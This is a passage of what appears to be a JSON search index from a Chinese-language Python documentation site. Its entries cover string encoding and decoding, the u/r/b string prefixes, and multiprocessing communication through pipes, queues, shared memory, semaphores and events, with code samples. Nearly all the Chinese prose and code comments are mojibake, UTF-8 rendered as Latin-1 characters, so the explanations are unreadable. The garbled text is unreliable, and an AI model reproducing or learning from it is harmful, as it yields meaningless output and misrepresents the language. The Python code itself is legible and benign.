Pool","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Process-and-thread.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Process-and-thread.html"},{"title":"Pythonçš„ç¼–ç ","text":"å­—ç¬¦ç¼–ç  ä¸ºäº†å¤„ç†è‹±æ–‡å­—ç¬¦ï¼Œäº§ç”Ÿäº†ASCIIç ã€‚ ä¸ºäº†å¤„ç†ä¸­æ–‡å­—ç¬¦ï¼Œäº§ç”Ÿäº†GB2312ã€‚ ä¸ºäº†å¤„ç†å„å›½å­—ç¬¦ï¼Œäº§ç”Ÿäº†Unicodeã€‚ ä¸ºäº†æé«˜Unicodeå­˜å‚¨å’Œä¼ è¾“æ€§èƒ½ï¼Œäº§ç”Ÿäº†UTF-8ï¼Œå®ƒæ˜¯Unicodeçš„ä¸€ç§å®ç°å½¢å¼ã€‚ encodeå’Œdecode è®²è§£ç¼–ç å’Œè§£ç ä¹‹å‰ï¼Œå…ˆæ¥è®²è®²Unicodeå’Œutf-8çš„å…³ç³»ï¼Œ æ¨è http://flyer103.diandian.com/post/2014-03-09/40061199665 å¯ä»¥è¿™æ ·æ¥ç†è§£: å­—ç¬¦ä¸²æ˜¯ç”±å­—ç¬¦æ„æˆï¼Œå­—ç¬¦åœ¨è®¡ç®—æœºç¡¬ä»¶ä¸­é€šè¿‡äºŒè¿›åˆ¶å½¢å¼å­˜å‚¨ï¼Œ è¿™ç§äºŒè¿›åˆ¶å½¢å¼å°±æ˜¯ç¼–ç ã€‚ å¦‚æœç›´æ¥ä½¿ç”¨: å­—ç¬¦ä¸²â†”ï¸å­—ç¬¦â†”ï¸äºŒè¿›åˆ¶è¡¨ç¤ºï¼ˆç¼–ç ï¼‰ ä¼šå¢åŠ ä¸åŒç±»å‹ç¼–ç ä¹‹é—´è½¬æ¢çš„å¤æ‚æ€§ã€‚æ‰€ä»¥å¼•å…¥äº†ä¸€ä¸ªæŠ½è±¡å±‚: å­—ç¬¦ä¸²â†”ï¸å­—ç¬¦â†”ï¸ä¸å­˜å‚¨æ— å…³çš„è¡¨ç¤ºâ†”ï¸äºŒè¿›åˆ¶è¡¨ç¤ºï¼ˆç¼–ç ï¼‰ è¿™æ ·ï¼Œå¯ä»¥ç”¨ä¸€ç§ä¸å­˜å‚¨æ— å…³çš„å½¢å¼è¡¨ç¤ºå­—ç¬¦ï¼Œ ä¸åŒçš„ç¼–ç ä¹‹é—´è½¬æ¢æ—¶å¯ä»¥å…ˆè½¬æ¢åˆ°è¿™ä¸ªæŠ½è±¡å±‚ï¼Œç„¶åå†è½¬æ¢ä¸ºå…¶ä»–ç¼–ç å½¢å¼ã€‚ åœ¨è¿™é‡Œï¼Œunicode å°±æ˜¯ \"ä¸å­˜å‚¨æ— å…³çš„è¡¨ç¤º\"ï¼Œutfâ€”8 å°±æ˜¯ \"äºŒè¿›åˆ¶è¡¨ç¤º\"ã€‚ python2ä¸­å­—ç¬¦ä¸²æœ‰ä¸¤ç§è¡¨ç¤ºå½¢å¼ï¼Œstrå’Œunicodeã€‚ strå¯ä»¥ç†è§£ä¸ºä¸Šé¢è¿™æ®µè¯ä¸­çš„äºŒè¿›åˆ¶ç¼–ç æ ¼å¼ï¼Œunicodeå¯ä»¥ç†è§£ä¸ºæŠ½è±¡å±‚ã€‚ encodeæ˜¯ç¼–ç ï¼Œå³ä»unicodeæ ¼å¼åˆ°äºŒè¿›åˆ¶çš„ç¼–ç æ ¼å¼å¦‚utf-8ã€gb2312ç­‰ã€‚decodeæ˜¯è§£ç ï¼Œ å³ä»äºŒè¿›åˆ¶ç¼–ç æ ¼å¼åˆ°unicodeç¼–ç æ ¼å¼ã€‚ åŸæ–‡: https://www.cnblogs.com/jinhaolin/p/5128973.html Pythonçš„å­—ç¬¦ç¼–ç  Python2ä¸­é»˜è®¤çš„å­—ç¬¦ç¼–ç æ˜¯ASCIIç ã€‚ Python2ä¸­å­—ç¬¦ä¸²æœ‰strå’Œunicodeä¸¤ç§ç±»å‹ã€‚stræœ‰å„ç§ç¼–ç çš„åŒºåˆ«ï¼Œunicodeæ˜¯æ²¡æœ‰ç¼–ç çš„æ ‡å‡†å½¢å¼ã€‚ Python2ä¸­å¯ä»¥ç›´æ¥æŸ¥çœ‹åˆ°unicodeçš„å­—èŠ‚ä¸²ã€‚ python3é»˜è®¤ä½¿ç”¨unicodeç¼–ç ï¼Œunicodeå­—èŠ‚ä¸²å°†è¢«ç›´æ¥å¤„ç†ä¸ºä¸­æ–‡æ˜¾ç¤ºå‡ºæ¥ã€‚ decode()ä¸encode()æ–¹æ³• decode()æ–¹æ³•å°†å…¶ä»–ç¼–ç å­—ç¬¦è½¬åŒ–ä¸ºUnicodeç¼–ç å­—ç¬¦ã€‚ encode()æ–¹æ³•å°†Unicodeç¼–ç å­—ç¬¦è½¬åŒ–ä¸ºå…¶ä»–ç¼–ç å­—ç¬¦ã€‚ python3ä¸€ä¸ªæ–°ç‰¹æ€§å°±æ˜¯å¯¹æ–‡æœ¬å’ŒäºŒè¿›åˆ¶åšäº†æ›´æ¸…æ™°çš„åˆ’åˆ†ï¼Œæ–‡æœ¬æ˜¯strï¼ŒäºŒè¿›åˆ¶æ˜¯byte(x01x06...) ç¼–ç : encodeï¼šstr --> byte è§£ç : decodeï¼šbyte --> str å®é™…é‡åˆ°çš„é—®é¢˜ win10ä¸‹python2.7è¯»å–ä¸€ä¸ªtxtæ–‡æœ¬å‡ºç°äº†ä¹±ç  æœ€ç»ˆè§£å†³æ–¹æ¡ˆæœ‰ä¸¤ä¸ªï¼š æ–¹æ¡ˆä¸€: ä½¿ç”¨decodeæ–¹æ³•: #text.txtæ˜¯è¯»å–çš„æ–‡ä»¶å†…å®¹ï¼Œç¼–ç ANSIï¼Œå®é™…åº”è¯¥æ˜¯gb2312å§ with open(\"text.txt\",\"r\") as f: lines = f.readlines() #å°†å†…å®¹è½¬æ¢ä¸ºæ•°ç»„ for line in lines: print line.decode('gb2312') #ç›´æ¥print lineä¼šæŠ¥é”™ï¼Œå‚æ•°ä¸ºåŸæœ¬çš„ç¼–ç  decodeå‡½æ•°çš„å‚æ•°æ˜¯æœ¬èº«çš„ç¼–ç ï¼Œè¡¨ç¤ºä»¥æ­¤ç¼–ç è§£æä¸ºunicode æ–¹æ¡ˆäºŒ: å¯¼å…¥codecsæ¨¡å—: #text.txtæ˜¯è¯»å–çš„æ–‡ä»¶å†…å®¹ï¼Œç¼–ç ANSIï¼Œå®é™…åº”è¯¥æ˜¯gb2312å§ #codesc.opençš„encodingå‚æ•°å¯ä»¥æŒ‡å®šåŸæ–‡ä»¶çš„ç¼–ç ï¼Œè¯»å–å†™å…¥å°±ä¼šè‡ªåŠ¨è½¬æ¢ with codecs.open(\"text.txt\",\"r\",encoding=\"gb2312\") as f: lines = f.readlines() #å°†å†…å®¹è½¬æ¢ä¸ºæ•°ç»„ for line in lines: print line å…¶ä»– è¯»æ–‡ä»¶æ—¶å€™asacllä¸€ç›´æ— æ³•è½¬æ¢æˆåŠŸï¼Œä½¿ç”¨json.dumpsè§£å†³: >>> a='\\xe6\\x81\\xb6\\xe6\\x84\\x8f\\xe8\\xbd\\xaf\\xe4\\xbb\\xb6' >>> bb=json.dumps(a, encoding=\"UTF-8\", ensure_ascii=False) >>> print(bb)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Python's-encoding.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Python's-encoding.html"},{"title":"å­—ç¬¦ä¸²å‰é¢åŠ u,r,bçš„å«ä¹‰","text":"u/U è¡¨ç¤ºunicodeå­—ç¬¦ä¸² ä¸æ˜¯ä»…ä»…æ˜¯é’ˆå¯¹ä¸­æ–‡, å¯ä»¥é’ˆå¯¹ä»»ä½•çš„å­—ç¬¦ä¸²ï¼Œä»£è¡¨æ˜¯å¯¹å­—ç¬¦ä¸²è¿›è¡Œunicodeç¼–ç ã€‚ ä¸€èˆ¬è‹±æ–‡å­—ç¬¦åœ¨ä½¿ç”¨å„ç§ç¼–ç ä¸‹, åŸºæœ¬éƒ½å¯ä»¥æ­£å¸¸è§£æ, æ‰€ä»¥ä¸€èˆ¬ä¸å¸¦uï¼›ä½†æ˜¯ä¸­æ–‡, å¿…é¡»è¡¨æ˜æ‰€éœ€ç¼–ç , å¦åˆ™ä¸€æ—¦ç¼–ç è½¬æ¢å°±ä¼šå‡ºç°ä¹±ç ã€‚ å»ºè®®æ‰€æœ‰ç¼–ç æ–¹å¼é‡‡ç”¨utf8 r/R éè½¬ä¹‰çš„åŸå§‹å­—ç¬¦ä¸² ä¸æ™®é€šå­—ç¬¦ç›¸æ¯”ï¼Œå…¶ä»–ç›¸å¯¹ç‰¹æ®Šçš„å­—ç¬¦ï¼Œå…¶ä¸­å¯èƒ½åŒ…å«è½¬ä¹‰å­—ç¬¦ï¼Œå³é‚£äº›ï¼Œåæ–œæ åŠ ä¸Šå¯¹åº”å­—æ¯ï¼Œ è¡¨ç¤ºå¯¹åº”çš„ç‰¹æ®Šå«ä¹‰çš„ï¼Œæ¯”å¦‚æœ€å¸¸è§çš„\"n\"è¡¨ç¤ºæ¢è¡Œï¼Œ\"t\"è¡¨ç¤ºTabç­‰ã€‚ è€Œå¦‚æœæ˜¯ä»¥rå¼€å¤´ï¼Œé‚£ä¹ˆè¯´æ˜åé¢çš„å­—ç¬¦ï¼Œéƒ½æ˜¯æ™®é€šçš„å­—ç¬¦äº†ï¼Œå³å¦‚æœæ˜¯\"n\"é‚£ä¹ˆè¡¨ç¤ºä¸€ä¸ªåæ–œæ å­—ç¬¦ï¼Œä¸€ä¸ªå­—æ¯nï¼Œè€Œä¸æ˜¯è¡¨ç¤ºæ¢è¡Œäº†ã€‚ ä»¥rå¼€å¤´çš„å­—ç¬¦ï¼Œå¸¸ç”¨äºæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯¹åº”ç€reæ¨¡å—ã€‚ b:bytes python3.xé‡Œé»˜è®¤çš„stræ˜¯(py2.xé‡Œçš„)unicode, bytesæ˜¯(py2.x)çš„str, b\"\"å‰ç¼€ä»£è¡¨çš„å°±æ˜¯bytes python2.xé‡Œ, bå‰ç¼€æ²¡ä»€ä¹ˆå…·ä½“æ„ä¹‰ï¼Œ åªæ˜¯ä¸ºäº†å…¼å®¹python3.xçš„è¿™ç§å†™æ³•","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-The-meaning-of-add-U,-R,-B-in-front-of-the-string.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-The-meaning-of-add-U,-R,-B-in-front-of-the-string.html"},{"title":"Pythonå¤šè¿›ç¨‹","text":"Pythonå¤šè¿›ç¨‹æ–¹é¢æ¶‰åŠçš„æ¨¡å—ä¸»è¦åŒ…æ‹¬: /docs/åç«¯/python/pythonæ ‡å‡†åº“/subprocess /docs/åç«¯/python/pythonæ ‡å‡†åº“/mmap /docs/åç«¯/python/pythonæ ‡å‡†åº“/multiprocessing : æä¾›æ”¯æŒå¤šå¤„ç†å™¨æŠ€æœ¯çš„å¤šè¿›ç¨‹ç¼–ç¨‹æ¥å£, å¹¶ä¸”æ¥å£çš„è®¾è®¡æœ€å¤§ç¨‹åº¦åœ°ä¿æŒäº†å’Œthreadingæ¨¡å—çš„ä¸€è‡´, ä¾¿äºç†è§£å’Œä½¿ç”¨. è¿›ç¨‹é—´é€šä¿¡ ä¿¡å·, ç®¡é“(ä¸å®‰å…¨,é»˜è®¤æ²¡åŠ é”), æ¶ˆæ¯é˜Ÿåˆ—, ä¿¡å·é‡, å…±äº«å†…å­˜, socket ä¿¡å· signal. åœ¨å¤šä¸ªè¿›ç¨‹ä¸­é€šä¿¡çš„æœºåˆ¶ä¸­, åªæœ‰singalæ˜¯å¼‚æ­¥æ‰§è¡Œçš„ ç®¡é“ åŠåŒå·¥,é»˜è®¤æ— é”, ä¸å®‰å…¨, åŒå‘é€šä¿¡(åªèƒ½ä¸€ç«¯å‘, ä¸€ç«¯æ”¶) - åŒ¿åç®¡é“, åªèƒ½åœ¨å…·æœ‰äº²ç¼˜å…³ç³»è¿›ç¨‹é—´é€šä¿¡ - å‘½åç®¡é“, å…è®¸æ— äº²ç¼˜å…³ç³»è¿›ç¨‹é€šä¿¡ æ¶ˆæ¯é˜Ÿåˆ— ç”±æ¶ˆæ¯ç»„æˆçš„é“¾è¡¨, å­˜æ”¾åœ¨å†…æ ¸ä¸­å¹¶ç”±æ¶ˆæ¯é˜Ÿåˆ—æ ‡è¯†ç¬¦æ ‡è¯†. æ¶ˆæ¯é˜Ÿåˆ—å…‹æœäº†ä¿¡å·ä¼ é€’ä¿¡æ¯å°‘ã€ç®¡é“åªèƒ½æ‰¿è½½æ— æ ¼å¼å­—èŠ‚æµä»¥åŠç¼“å†²åŒºå¤§å°å—é™ç­‰ç¼ºç‚¹ ä¿¡å·é‡ æ˜¯ä¸€ä¸ªè®¡æ•°å™¨, å¯ä»¥ç”¨æ¥æ§åˆ¶å¤šä¸ªè¿›ç¨‹å¯¹å…±äº«èµ„æºçš„è®¿é—®. å®ƒå¸¸ä½œä¸ºä¸€ç§é”æœºåˆ¶, é˜²æ­¢æŸè¿›ç¨‹æ­£åœ¨è®¿é—®å…±äº«èµ„æºæ—¶, å…¶ä»–è¿›ç¨‹ä¹Ÿè®¿é—®è¯¥èµ„æº. å› æ­¤, ä¸»è¦ä½œä¸ºè¿›ç¨‹é—´ä»¥åŠåŒä¸€è¿›ç¨‹å†…ä¸åŒçº¿ç¨‹ä¹‹é—´çš„åŒæ­¥æ‰‹æ®µ. å…±äº«å†…å­˜ å…±äº«å†…å­˜å°±æ˜¯æ˜ å°„ä¸€æ®µèƒ½è¢«å…¶ä»–è¿›ç¨‹æ‰€è®¿é—®çš„å†…å­˜, è¿™æ®µå…±äº«å†…å­˜ç”±ä¸€ä¸ªè¿›ç¨‹åˆ›å»º, ä½†å¤šä¸ªè¿›ç¨‹éƒ½å¯ä»¥è®¿é—®. å…±äº«å†…å­˜æ˜¯æœ€å¿«çš„ IPC æ–¹å¼, å®ƒæ˜¯é’ˆå¯¹å…¶ä»–è¿›ç¨‹é—´é€šä¿¡æ–¹å¼è¿è¡Œæ•ˆç‡ä½è€Œä¸“é—¨è®¾è®¡çš„. å®ƒå¾€å¾€ä¸å…¶ä»–é€šä¿¡æœºåˆ¶, å¦‚ä¿¡å·é‡, é…åˆä½¿ç”¨, æ¥å®ç°è¿›ç¨‹é—´çš„åŒæ­¥å’Œé€šä¿¡. å¥—æ¥å­— ä¹Ÿæ˜¯ä¸€ç§è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶, ä¸å…¶ä»–é€šä¿¡æœºåˆ¶ä¸åŒçš„æ˜¯, å®ƒå¯ç”¨äºä¸åŒæœºå™¨ä¹‹é—´çš„è¿›ç¨‹é€šä¿¡. äº‹ä»¶ pythonè¿›ç¨‹çš„äº‹ä»¶ç”¨äºä¸»è¿›ç¨‹æ§åˆ¶å…¶ä»–è¿›ç¨‹çš„æ‰§è¡Œ ä¿¡å· signal ä¿¡å·é€šè¿‡æ³¨å†Œçš„æ–¹å¼â€˜æŒ‚'åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­, å¹¶ä¸”ä¸ä¼šé˜»å¡è¯¥è¿›ç¨‹çš„è¿è¡Œã€‚ ä¸€ä¸ªè¿›ç¨‹ä¸€æ—¦æ¥æ”¶åˆ°å…¶ä»–è¿›ç¨‹ï¼ˆå¯èƒ½æ˜¯åº”ç”¨ä¸­çš„å…¶ä»–è¿›ç¨‹, ä¹Ÿå¯èƒ½ä½¿æ“ä½œç³»ç»Ÿä¸­çš„è¿›ç¨‹ï¼‰å‘é€çš„ä¿¡å·å°±ä¼šæ‰“æ–­åŸæ¥çš„ç¨‹åºæ‰§è¡Œæµç¨‹æ¥å¤„ç†è¿™ä¸ªä¿¡å·ã€‚ æ³¨è§£ å¼‚æ­¥: ç¨‹åºåœ¨æ‰§è¡Œä¸­åˆ©ç”¨å†…æ ¸åŠŸèƒ½å¸®åŠ©å®Œæˆå¿…è¦çš„è¾…åŠ©æ“ä½œ,ä¸å½±å“åº”ç”¨å±‚æŒç»­æ‰§è¡Œ æ³¨æ„: è¿™é‡Œçš„åŒæ­¥å’Œå¼‚æ­¥æœºåˆ¶æ˜¯ç›¸å¯¹å¤šè¿›ç¨‹è€Œè¨€çš„ã€‚ åœ¨å¤šä¸ªè¿›ç¨‹ä¸­é€šä¿¡çš„æœºåˆ¶ä¸­, åªæœ‰singalæ˜¯å¼‚æ­¥æ‰§è¡Œçš„ å’Œkillç›¸å…³çš„å‡ ä¸ªå‡½æ•°: signal.alarm(sec): è§ /docs/åç«¯/python/pythonæ ‡å‡†åº“/signal signal.pause(): è§ /docs/åç«¯/python/pythonæ ‡å‡†åº“/signal signal.signal(sig,handler): è§ /docs/åç«¯/python/pythonæ ‡å‡†åº“/signal ç®¡é“ ç®¡é“, åŠåŒå·¥,é»˜è®¤æ— é”, ä¸å®‰å…¨, åŒå‘é€šä¿¡(ä¸€ç«¯å‘, ä¸€ç«¯æ”¶) åŒ¿åç®¡é“, åªèƒ½åœ¨å…·æœ‰äº²ç¼˜å…³ç³»è¿›ç¨‹é—´é€šä¿¡ å‘½åç®¡é“, å…è®¸æ— äº²ç¼˜å…³ç³»è¿›ç¨‹é€šä¿¡ from multiprocessing import Pipe æ¶ˆæ¯é˜Ÿåˆ— æ¶ˆæ¯é˜Ÿåˆ—, åŸºäºç®¡é“å®ç°, æœ‰åŠ é”, æ•°æ®å®‰å…¨ æ¶ˆæ¯é˜Ÿåˆ—æ˜¯ç”±æ¶ˆæ¯ç»„æˆçš„é“¾è¡¨, å­˜æ”¾åœ¨å†…æ ¸ä¸­å¹¶ç”±æ¶ˆæ¯é˜Ÿåˆ—æ ‡è¯†ç¬¦æ ‡è¯†. æ¶ˆæ¯é˜Ÿåˆ—å…‹æœäº†ä¿¡å·ä¼ é€’ä¿¡æ¯å°‘ã€ç®¡é“åªèƒ½æ‰¿è½½æ— æ ¼å¼å­—èŠ‚æµä»¥åŠç¼“å†²åŒºå¤§å°å—é™ç­‰ç¼ºç‚¹. Queue JoinableQueue : æœ‰putç«¯å’Œgetçš„æŠ€æœ¯æœºåˆ¶. æ¯æ¬¡get()æ•°æ®å‘é€task_done() putç«¯è®¡æ•°-1, ç›´åˆ°get()ç«¯å–å®Œäº†é˜Ÿåˆ—çš„æ‰€æœ‰æ•°æ®, put()ç«¯çš„join()å°±ä¼šæ¥å—åˆ°ä¿¡å·, ç›´åˆ°get()ç«¯å·²ç»æ¥å—å®Œæ•°æ®äº† å…±äº«å†…å­˜ å…±äº«å†…å­˜å°±æ˜¯æ˜ å°„ä¸€æ®µèƒ½è¢«å…¶ä»–è¿›ç¨‹æ‰€è®¿é—®çš„å†…å­˜. è¿™æ®µå…±äº«å†…å­˜ç”±ä¸€ä¸ªè¿›ç¨‹åˆ›å»º, ä½†å¤šä¸ªè¿›ç¨‹éƒ½å¯ä»¥è®¿é—®. å…±äº«å†…å­˜æ˜¯æœ€å¿«çš„ IPC æ–¹å¼, å®ƒæ˜¯é’ˆå¯¹å…¶ä»–è¿›ç¨‹é—´é€šä¿¡æ–¹å¼è¿è¡Œæ•ˆç‡ä½è€Œä¸“é—¨è®¾è®¡çš„. å®ƒå¾€å¾€ä¸å…¶ä»–é€šä¿¡æœºåˆ¶, å¦‚ä¿¡å·é‡, é…åˆä½¿ç”¨, æ¥å®ç°è¿›ç¨‹é—´çš„åŒæ­¥å’Œé€šä¿¡. from multiprocessing import Manager ä¾‹: # å…±äº«å†…å­˜, ä¸¾ä¾‹, https://www.jb51.net/article/232067.htm from multiprocessing import Value,Array obj = Value(ctype,data) # åŠŸèƒ½: å¼€è¾Ÿå…±äº«å†…å­˜ # å‚æ•°: ctype è¡¨ç¤ºå…±äº«å†…å­˜ç©ºé—´ç±»å‹ 'i' 'f' 'c' # data å…±äº«å†…å­˜ç©ºé—´åˆå§‹æ•°æ® # è¿”å›å€¼: å…±äº«å†…å­˜å¯¹è±¡ obj.value # å¯¹è±¡å±æ€§çš„ä¿®æ”¹æŸ¥çœ‹å³å¯¹å…±äº«å†…å­˜è¯»å†™ obj = Array(ctype,data) # åŠŸèƒ½: å¼€è¾Ÿå…±äº«å†…å­˜ # å‚æ•°: ctype è¡¨ç¤ºå…±äº«å†…å­˜ç©ºé—´ç±»å‹ 'i' 'f' 'c' # data æ•´æ•°è¡¨ç¤ºå¼€è¾Ÿç©ºé—´çš„å¤§å°,å…¶æ•°æ®è¡¨ç¤ºå¼€è¾Ÿç©ºé—´ # è¿”å›å€¼: å…±äº«å†…å­˜å¯¹è±¡ # Arrayå…±äº«å†…å­˜è¯»å†™:é€šè¿‡éå†objå¯ä»¥å¾—åˆ°æ¯ä¸ªå€¼,ç›´æ¥é€šè¿‡ç´¢å¼•å¯ä»¥ä¿®æ”¹ # * å¯ä»¥ä½¿ç”¨obj.value ç›´æ¥æ‰“å°å…±äº«å†…å­˜ä¸­çš„å­—èŠ‚ä¸² ä¿¡å·é‡ ä¿¡å·é‡(ä¿¡å·ç¯é›†) ç»™å®šä¸€ä¸ªæ•°é‡å¯¹å¤šä¸ªè¿›ç¨‹å¯è§,å¤šä¸ªè¿›ç¨‹éƒ½å¯ä»¥æ“ä½œè¯¥æ•°å¢å‡,å¹¶æ ¹æ®æ•°é‡å€¼å†³å®šè‡ªå·±çš„è¡Œ ä¿¡å·é‡æ˜¯ä¸€ä¸ªè®¡æ•°å™¨, å¯ä»¥ç”¨æ¥æ§åˆ¶å¤šä¸ªè¿›ç¨‹å¯¹å…±äº«èµ„æºçš„è®¿é—®. å®ƒå¸¸ä½œä¸ºä¸€ç§é”æœºåˆ¶, é˜²æ­¢æŸè¿›ç¨‹æ­£åœ¨è®¿é—®å…±äº«èµ„æºæ—¶, å…¶ä»–è¿›ç¨‹ä¹Ÿè®¿é—®è¯¥èµ„æº. å› æ­¤, ä¸»è¦ä½œä¸ºè¿›ç¨‹é—´ä»¥åŠåŒä¸€è¿›ç¨‹å†…ä¸åŒçº¿ç¨‹ä¹‹é—´çš„åŒæ­¥æ‰‹æ®µ. from multiprocessing import Semaphore sem = Semaphore(num) # åŠŸèƒ½: åˆ›å»ºä¿¡å·é‡å¯¹è±¡ # å‚æ•°: ä¿¡å·é‡çš„åˆå§‹å€¼ # è¿”å›å€¼: ä¿¡å·é‡å¯¹è±¡ sem.acquire() # ä¿¡å·é‡å‡1 å½“ä¿¡å·é‡ä¸º0æ—¶é˜»å¡ sem.release() # ä¿¡å·é‡åŠ 1 sem.get_value() # è·å–ä¿¡å·é‡æ•°é‡ å¥—æ¥å­— å¥—æ¥å­—ï¼ˆsocketï¼‰é€šä¿¡ å¥—æ¥å£ä¹Ÿæ˜¯ä¸€ç§è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶, ä¸å…¶ä»–é€šä¿¡æœºåˆ¶ä¸åŒçš„æ˜¯, å®ƒå¯ç”¨äºä¸åŒæœºå™¨ä¹‹é—´çš„è¿›ç¨‹é€šä¿¡. multiprocessing.Manager å…±äº«å…¨å±€å˜é‡ (å…±äº«å†…å­˜) æ³¨æ„, å¦‚æœè¦å…±äº«å˜é‡, åªèƒ½å°†å…±äº«çš„å˜é‡å®šä¹‰åœ¨å¤–éƒ¨ä½¿ç”¨, ç„¶åè°ƒç”¨è¿›ç¨‹çš„æ—¶å€™ä¼ å…¥, æœ€ç»ˆè·å–è¿˜æ˜¯åœ¨ä½¿ç”¨å¤–éƒ¨å‘½åè·å–: # coding: utf-8 \"\"\" python è¿›ç¨‹é—´é€šä¿¡æµ‹è¯•, ä¸»è¿›ç¨‹è·Ÿ, å¼‚æ­¥è¿›ç¨‹æ±  \"\"\" import asyncio import time from concurrent.futures import ProcessPoolExecutor from multiprocessing import Manager, Pipe from typing import Optional class SonPool(object): _total: Optional[int] = None _now: Optional[int] = None _total_manager = None _now_manager = None _list_manager = [None, None] @classmethod def get_now_and_total(cls): return [cls._now, cls._total] @classmethod def get_now_and_total_manager_val(cls): print('_manager', cls._now_manager, cls._total_manager) if cls._now_manager and type(cls._now_manager) != int: print('_manager', cls._now_manager.value, cls._total_manager.value) return [cls._now_manager.value, cls._total_manager.value] return [cls._now_manager, cls._total_manager] @classmethod def get_list_manager_val(cls): print('inner _list_manager', [x for x in cls._list_manager]) return cls._list_manager @classmethod def _reset(cls): cls._total = None cls._now = None cls._total_manager = Manager().Value(int, 1) cls._now_manager = Manager().Value(int, 1) cls._list_manager = Manager().list([None, None]) @staticmethod async def _async_long_time_wait(): await asyncio.sleep(3) print('sleep 3 s') @staticmethod def _long_time_wait(*args): time.sleep(5) print('sleep 5', *args) @classmethod def _set_total(cls): cls._long_time_wait('total') cls._total = 100 if cls._total_manager: cls._total_manager.value = 101 else: cls._total_manager = 101 cls._list_manager.append(102) @classmethod def _set_now(cls): cls._long_time_wait('now') cls._now = 10 if cls._now_manager: cls._now_manager.value = 11 else: cls._now_manager = 11 cls._list_manager.append(12) @classmethod def run(cls, *args, **kwargs): if args: # cls._list_manager = arg_dict.get('list_manager') cls._list_manager = args[0] cls._total_manager = args[1] cls._now_manager = args[2] cls._set_now() cls._set_total() print('inner SonPool val', '\\ninner now, total: ', SonPool.get_now_and_total(), '\\ninner now, total manager: ', SonPool.get_now_and_total_manager_val(), '\\ninner list manager: ', SonPool.get_list_manager_val(), ) async def main_process(): loop = asyncio.get_running_loop() pool = ProcessPoolExecutor() # ç±»å†…å®šä¹‰å˜é‡ä¸æ”¯æŒè¿›ç¨‹ä¹‹é—´å…±äº«, é”™è¯¯ç”¨æ³• SonPool._total_manager = Manager().Value(int, None) SonPool._now_manager = Manager().Value(int, None) SonPool._list_manager = Manager().list([None, None]) # ç”¨å˜é‡, å¤–éƒ¨å®šä¹‰, è¿™æ ·ä¼ å…¥æ‰å¯ä»¥æ­£ç¡®é€šä¿¡ list_manager = Manager().list([None, None]) total_manager = Manager().Value(int, None) now_manager = Manager().Value(int, None) # è¿™æ ·å¤–éƒ¨å°è£…ä¹Ÿè¡Œ, ä¸è¿‡ä¼ å…¥çš„æ—¶å€™è¿˜æ˜¯è¦ä¼ å…¥ LocalSonPool.total # class LocalSonPool(object): # total = Manager().Value(int, None) # now = Manager().Value(int, None) # list_m = Manager().list([None, None]) # ç”¨ç®¡é“ # è¿˜æ²¡å†™, fd1, fd2 = Pipe() async def _check_task1(m1, m2): while True: print('check_task1', m1.value, m2.value) await asyncio.sleep(1) # async def _check_task2(): # while True: # print('check_task2', now_manager.value, total_manager.value) # await asyncio.sleep(1) loop.create_task(_check_task1(now_manager, total_manager)) # è¿™æ ·ä¹Ÿå¯ä»¥ # loop.create_task(_check_task2()) # await loop.run_in_executor(pool, SonPool.run, ) await loop.run_in_executor(pool, SonPool.run, list_manager, total_manager, now_manager,) print('main val', # SonPool mainè·Ÿè¿›ç¨‹æ± ç”¨çš„æ˜¯ä¸¤ä¸ªä¸åŒç©ºé—´çš„, æ‰€ä»¥ä¸èƒ½è¿™æ ·ç”¨ '\\nmain now, total: ', SonPool.get_now_and_total(), '\\nmain now, total manager: ', SonPool.get_now_and_total_manager_val(), '\\nmain list manager: ', SonPool.get_list_manager_val(), # åªæœ‰ä¸‹é¢çš„è¿™æ ·, å®šä¹‰åœ¨main, ä½¿ç”¨mainçš„è°ƒç”¨æ‰å¯ä»¥è·å–åˆ°å€¼ '\\nouter list manager', [x for x in list_manager], '\\nouter now manager', now_manager.value, '\\nouter total manager', total_manager.value, ) def main(): loop = asyncio.get_event_loop() loop.create_task(main_process()) loop.run_forever() if __name__ == '__main__': main() äº‹ä»¶ pythonè¿›ç¨‹çš„äº‹ä»¶ç”¨äºä¸»è¿›ç¨‹æ§åˆ¶å…¶ä»–è¿›ç¨‹çš„æ‰§è¡Œ, äº‹ä»¶ä¸»è¦æä¾›äº†ä¸‰ä¸ªæ–¹æ³• setã€waitã€clear. äº‹ä»¶å¤„ç†çš„æœºåˆ¶: æƒ³è±¡å…¨å±€å®šä¹‰äº†ä¸€ä¸ª\"Flag\", å¦‚æœ\"Flag\"å€¼ä¸º False, é‚£ä¹ˆå½“ç¨‹åºæ‰§è¡Œ event.wait æ–¹æ³•æ—¶å°±ä¼šé˜»å¡, å¦‚æœ\"Flag\"å€¼ä¸ºTrue, é‚£ä¹ˆevent.wait æ–¹æ³•æ—¶ä¾¿ä¸å†é˜»å¡. å…¶ä¸­, clearæ–¹æ³•: å°†\"Flag\"è®¾ç½®ä¸ºFalse, setæ–¹æ³•: å°†\"Flag\"è®¾ç½®ä¸ºTrue: # æ¥æº: https://zhuanlan.zhihu.com/p/446374478 import multiprocessing import time from multiprocessing import Process, Queue, set_start_method event = multiprocessing.Event() def xiao_fan(event): print('å°è´©: ç”Ÿäº§...') print('å°è´©: å”®å–...') # time.sleep(1) print('å°è´©: ç­‰å¾…å°±é¤') event.set() event.clear() event.wait() print('å°è´©: è°¢è°¢å…‰ä¸´') event.set() event.clear() def gu_ke(event): print('é¡¾å®¢: å‡†å¤‡ä¹°æ—©é¤') event.set() event.clear() event.wait() print('é¡¾å®¢: ä¹°åˆ°æ—©é¤') print('é¡¾å®¢: äº«å—ç¾é£Ÿ') # time.sleep(2) print('é¡¾å®¢: ä»˜æ¬¾, çœŸå¥½åƒ...') event.set() event.clear() if __name__ == '__main__': set_start_method('fork', True) # åˆ›å»ºè¿›ç¨‹ xf = multiprocessing.Process(target=xiao_fan, args=(event,)) gk = multiprocessing.Process(target=gu_ke, args=(event, )) # å¯åŠ¨è¿›ç¨‹ gk.start() xf.start() # time.sleep(2) äº’æ–¥é”-è¿›ç¨‹é” å¯ä½¿ç”¨ /docs/åç«¯/python/pythonæ 